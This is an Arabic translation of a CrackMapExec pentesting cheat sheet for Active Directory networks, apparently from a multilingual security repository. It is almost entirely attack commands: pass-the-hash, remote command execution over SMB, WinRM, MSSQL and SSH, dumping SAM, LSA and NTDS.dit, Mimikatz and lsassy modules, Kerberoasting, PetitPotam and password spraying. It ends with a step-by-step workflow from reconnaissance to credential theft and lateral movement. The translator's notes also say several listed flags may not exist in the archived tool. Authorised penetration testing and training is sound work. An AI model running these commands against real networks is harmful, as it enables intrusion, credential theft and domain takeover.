<a id="-crackmapexec---ad-swiss-army-knife"></a>
# 🗡️ CrackMapExec - أداة متعددة الاستخدامات لاختبار AD

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec - A Swiss Army Knife for Pentesting
```

> يعرض الرسم النصي اسم الأداة بالإنجليزية؛ تشبّهها عبارة Swiss Army Knife بأداة متعددة الاستخدامات لاختبار الشبكات. **ملاحظة للإصدارات:** أُرشف مستودع CrackMapExec الأصلي في 6 ديسمبر 2023. يصف NetExec نفسه بأنه استمرار مجتمعي نابع من المشروع، ويستخدم الاسم nxc. احتُفظ هنا بأسماء cme وcrackmapexec وأمثلة المصدر التاريخية؛ لا يعني ذلك تطابق أوامر المشروعين أو خياراتهما أو وحداتهما في كل إصدار. [المستودع المؤرشف](https://github.com/byt3bl33d3r/CrackMapExec)، [تاريخ NetExec الرسمي](https://github.com/Pennyw0rth/NetExec#netexec---the-network-execution-tool).

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو CrackMapExec](#-what-is-crackmapexec)
- [التثبيت](#-installation)
- [بروتوكول SMB](#-smb-protocol)
- [بروتوكول WinRM](#-winrm-protocol)
- [بروتوكول LDAP](#-ldap-protocol)
- [بروتوكول MSSQL](#-mssql-protocol)
- [بروتوكول SSH](#-ssh-protocol)
- [الوحدات (Modules)](#-modules)
- [رش كلمات المرور (Password Spraying)](#-password-spraying)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-crackmapexec"></a>
## 🎯 ما هو CrackMapExec

**CrackMapExec**، ويُختصر إلى CME، أداة لتقييم الشبكات في مرحلة ما بعد الوصول الأولي، وتدعم:

- 🖥️ **SMB** - المشاركات والجلسات وتنفيذ الأوامر
- 🔧 **WinRM** - الاتصال البعيد عبر PowerShell
- 📂 **LDAP** - جمع معلومات Active Directory
- 🗄️ **MSSQL** - اختبار هجمات SQL Server
- 🐧 **SSH** - أجهزة Linux
- 💉 **Pass-the-Hash** - إعادة استخدام بيانات الاعتماد

<a id="features"></a>
### الميزات

| الميزة | الوصف |
|---------|-------------|
| **دعم عدة بروتوكولات** | SMB, WinRM, LDAP, MSSQL, SSH |
| **تنفيذ متوازٍ** | اختبار عدة أهداف |
| **قاعدة بيانات للاعتمادات** | تتبّع بيانات الاعتماد التي تم الوصول إليها |
| **الوحدات (Modules)** | قابل للتوسعة بوحدات مخصصة |
| **تنسيقات الخرج** | خيارات متعددة للخرج |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="kali-linux"></a>
### Kali Linux

```bash
# التثبيت باستخدام apt
sudo apt update
sudo apt install crackmapexec

# أو باستخدام pipx (يوصي به المصدر)
pipx install crackmapexec
```

<a id="using-pipx"></a>
### استخدام pipx

```bash
# تثبيت pipx أولًا
sudo apt install pipx
pipx ensurepath

# تثبيت CME
pipx install crackmapexec
```

<a id="verify"></a>
### التحقق

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-smb-protocol"></a>
## 🖥️ بروتوكول SMB

<a id="basic-enumeration"></a>
### جمع معلومات أساسي

```bash
# التحقق من استجابة الأجهزة
cme smb 10.10.10.0/24

# جمع المعلومات باستخدام بيانات اعتماد
cme smb 10.10.10.10 -u user -p password

# مصادقة النطاق
cme smb 10.10.10.10 -u user -p password -d domain.local

# مصادقة محلية
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

<a id="pass-the-hash"></a>
### Pass-the-Hash

```bash
# استخدام SMB مع تجزئة NTLM
cme smb 10.10.10.10 -u user -H NTLMHASH

# التجزئة الكاملة بصيغة LM:NTLM
cme smb 10.10.10.10 -u user -H LM:NTLM

# تجربة التجزئة عبر أجهزة الشبكة
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

<a id="share-enumeration"></a>
### جمع معلومات المشاركات

```bash
# عرض المشاركات
cme smb 10.10.10.10 -u user -p password --shares

# تتبّع المشاركات بحثًا عن ملفات
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# عرض الملفات داخل المجلدات الفرعية
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

<a id="user-enumeration"></a>
### جمع معلومات المستخدمين

```bash
# عرض المستخدمين عبر RPC
cme smb 10.10.10.10 -u user -p password --users

# عرض المجموعات
cme smb 10.10.10.10 -u user -p password --groups

# عرض المستخدمين المسجّلين دخولًا
cme smb 10.10.10.10 -u user -p password --loggedon-users

# الحصول على معرّفات SID للمستخدمين
cme smb 10.10.10.10 -u user -p password --rid-brute
```

<a id="command-execution"></a>
### تنفيذ الأوامر

```bash
# تنفيذ أمر
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# التنفيذ باستخدام PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# أساليب تنفيذ مختلفة
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

<a id="credential-dumping"></a>
### استخراج بيانات الاعتماد

```bash
# استخراج SAM
cme smb 10.10.10.10 -u admin -p password --sam

# استخراج LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# استخراج NTDS.dit (يفترض المصدر صلاحيات DA على DC)
cme smb DC01.domain.local -u admin -p password --ntds

# استخراج NTDS بأسلوب محدد
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

<a id="smb-signing"></a>
### توقيع SMB

```bash
# فحص توقيع SMB (لهجمات ترحيل المصادقة)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

<a id="-winrm-protocol"></a>
## 🔧 بروتوكول WinRM

<a id="basic-usage"></a>
### الاستخدام الأساسي

```bash
# فحص الوصول عبر WinRM
cme winrm 10.10.10.10 -u user -p password

# فحص عدة أهداف
cme winrm 10.10.10.0/24 -u user -p password

# باستخدام التجزئة
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

<a id="command-execution-1"></a>
### تنفيذ الأوامر

```bash
# تنفيذ أمر
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# تنفيذ سكربت
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

<a id="credential-dumping-1"></a>
### استخراج بيانات الاعتماد

```bash
# استخراج SAM عبر WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# أسرار LSA
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

<a id="-ldap-protocol"></a>
## 📂 بروتوكول LDAP

<a id="enumeration"></a>
### جمع المعلومات

```bash
# استعلام LDAP أساسي
cme ldap DC01.domain.local -u user -p password

# عرض المستخدمين
cme ldap DC01 -u user -p password --users

# عرض المجموعات
cme ldap DC01 -u user -p password --groups

# حسابات يمكن اختبار AS-REP فيها
cme ldap DC01 -u user -p password --asreproast asrep.txt

# حسابات يمكن اختبار Kerberoasting فيها
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

<a id="password-policy"></a>
### سياسة كلمات المرور

```bash
# الحصول على سياسة كلمات المرور
cme ldap DC01 -u user -p password --password-policy
```

> **ملاحظة توافق LDAP:** لا يظهر الخيار `--password-policy` في محلّل LDAP العام المؤرشف الذي تمت مراجعته؛ لذا فالسطر منقول من المصدر ولا يُفترض دعمه في هذه النسخة لمجرد أن المثال يعرضه. تختلف الخيارات بحسب البروتوكول والإصدار. [محلّل خيارات LDAP الرسمي](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py).

<a id="user-attributes"></a>
### سمات المستخدمين

```bash
# الحصول على أوصاف المستخدمين
cme ldap DC01 -u user -p password -M get-desc-users

# الحصول على سمات محددة
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-mssql-protocol"></a>
## 🗄️ بروتوكول MSSQL

<a id="basic-usage-1"></a>
### الاستخدام الأساسي

```bash
# الاتصال بـ MSSQL
cme mssql 10.10.10.10 -u sa -p password

# مصادقة Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# باستخدام التجزئة
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

<a id="command-execution-2"></a>
### تنفيذ الأوامر

```bash
# التنفيذ عبر xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# تفعيل xp_cmdshell أولًا
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# تنفيذ أمر
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

> **توضيح لـ MSSQL:** لا يظهر `--enable-xp` في محلّل MSSQL العام المؤرشف الذي تمت مراجعته. كما أن `-q` ينفّذ استعلام SQL، وليس أمر صدفة نظام؛ المثال الأخير يستعلم عن إصدار SQL Server. احتُفظ بالأوامر كما في المصدر. [محلّل خيارات MSSQL الرسمي](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql/proto_args.py).

---

<a id="-ssh-protocol"></a>
## 🐧 بروتوكول SSH

<a id="basic-usage-2"></a>
### الاستخدام الأساسي

```bash
# فحص SSH
cme ssh 10.10.10.10 -u root -p password

# عدة أهداف
cme ssh 10.10.10.0/24 -u user -p password

# باستخدام ملف مفتاح
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

<a id="command-execution-3"></a>
### تنفيذ الأوامر

```bash
# تنفيذ أمر
cme ssh 10.10.10.10 -u root -p password -x "id"

# أوامر متعددة
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

<a id="-modules"></a>
## 🧩 الوحدات (Modules)

<a id="list-modules"></a>
### عرض الوحدات

```bash
# عرض جميع الوحدات
cme smb -L
cme winrm -L
cme ldap -L

# مساعدة الوحدة
cme smb -M mimikatz --options
```

<a id="popular-modules"></a>
### وحدات شائعة

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (استخراج بيانات LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# كلمات مرور تفضيلات نهج المجموعة (GPP)
cme smb DC01 -u user -p password -M gpp_password

# GPP AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

<a id="bloodhound-collection"></a>
### جمع بيانات BloodHound

```bash
# جمع بيانات BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

<a id="-password-spraying"></a>
## 🔓 رش كلمات المرور (Password Spraying)

<a id="basic-spraying"></a>
### رش كلمات المرور الأساسي

```bash
# اختبار كلمة مرور واحدة مع عدة مستخدمين
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# عدة كلمات مرور
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# دون تخمين شامل (تجربة كل تركيبة)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

> **تصحيح لوصف الخيار:** عند توفير ملف أسماء وملف كلمات مرور، تعني `--no-bruteforce` مطابقة كل اسم مع كلمة المرور المقابلة له بالترتيب، لا تجربة كل التركيبات بين القائمتين كما يوحي تعليق المصدر. بقي التعليق والأمر منقولين مع هذا التوضيح. [تعريف الخيار في المصدر الرسمي](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py).

<a id="network-spraying"></a>
### رش كلمات المرور عبر الشبكة

```bash
# رش كلمات المرور عبر الشبكة
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# قراءة الأهداف من ملف
cme smb targets.txt -u admin -p password --continue-on-success
```

<a id="lockout-awareness"></a>
### مراعاة قفل الحسابات

```bash
# فحص سياسة كلمات المرور أولًا
cme ldap DC01 -u user -p password --password-policy

# الخرج:
# الحد الأدنى لطول كلمة المرور: 8
# عدد كلمات المرور المحفوظة في السجل: 24
# حد المحاولات قبل القفل: 5
# مدة القفل: 30 دقيقة
```

---

<a id="-database"></a>
## 💾 قاعدة البيانات

<a id="cme-database"></a>
### قاعدة بيانات CME

```bash
# عرض بيانات الاعتماد
cmedb

# داخل cmedb:
creds           # عرض بيانات الاعتماد المخزّنة
hosts           # عرض الأجهزة التي شملها الفحص
```

<a id="export-data"></a>
### تصدير البيانات

```bash
# تنسيقات الخرج
cme smb 10.10.10.10 -u user -p password --log log.txt

# خرج JSON
cme smb 10.10.10.10 -u user -p password --json
```

> **ملاحظة توافق الخرج:** لا يظهر الخيار `--json` في محلّل الأوامر العام أو محلّل SMB المؤرشفَين اللذين تمت مراجعتهما؛ لا يثبت المثال توافر تصدير JSON بهذه الصيغة. أُبقيت أمثلة التصدير الأصلية، ويجب تفسيرها ضمن إصدار الأداة المقصود. [المحلّل العام](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py)، [محلّل SMB](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/proto_args.py).

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="authentication-methods"></a>
### أساليب المصادقة

| الأسلوب | الخيار |
|--------|--------|
| كلمة مرور | `-p password` |
| تجزئة NTLM | `-H HASH` |
| مفتاح AES | `--aesKey KEY` |
| Kerberos | `-k` |
| مصادقة محلية | `--local-auth` |

<a id="protocols"></a>
### البروتوكولات

| البروتوكول | المنفذ | حالة الاستخدام |
|----------|------|----------|
| SMB | 445 | مشاركات الملفات وتنفيذ الأوامر |
| WinRM | 5985/5986 | الاتصال البعيد عبر PowerShell |
| LDAP | 389/636 | جمع معلومات Active Directory |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | أنظمة Linux |

<a id="common-flags"></a>
### الخيارات الشائعة

| الخيار | الوصف |
|------|-------------|
| `-u` | اسم مستخدم أو ملف أسماء |
| `-p` | كلمة مرور أو ملف كلمات |
| `-H` | تجزئة NTLM |
| `-d` | النطاق |
| `-x` | أمر cmd |
| `-X` | أمر PowerShell |
| `--shares` | عرض المشاركات |
| `--users` | عرض المستخدمين |
| `--sam` | استخراج SAM |
| `--lsa` | استخراج LSA |
| `--ntds` | استخراج NTDS |

<a id="output-markers"></a>
### علامات الخرج

| العلامة | المعنى |
|--------|---------|
| `[+]` | نجاح |
| `[-]` | فشل |
| `[*]` | معلومات |
| `(Pwn3d!)` | تأكيد وصول إداري |

<a id="typical-workflow"></a>
### سير عمل نموذجي

```bash
# 1. استطلاع الشبكة
cme smb 10.10.10.0/24

# 2. رش كلمات المرور
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. فحص الوصول الإداري
cme smb 10.10.10.0/24 -u user -p password

# 4. استخراج بيانات الاعتماد
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. استخدام بيانات الاعتماد التي عُثر عليها
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

<a id="-resources"></a>
## 📚 مصادر

- [مستودع CrackMapExec على GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [ويكي CrackMapExec](https://wiki.porchetta.industries/)
- [وحدات CME](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

<a id="related-cheatsheets"></a>
### مراجع سريعة ذات صلة
- [BloodHound](../../BloodHound/translations/README.ar.md)
- [Impacket](../../Impacket/translations/README.ar.md)
- [Mimikatz](../../Mimikatz/translations/README.ar.md)

---

<p align="center">
  <b>🗡️ فهم مسارات السيطرة على الشبكة!</b><br>
  <i>CrackMapExec - أداة متعددة الاستخدامات لمختبر الاختراق</i>
</p>
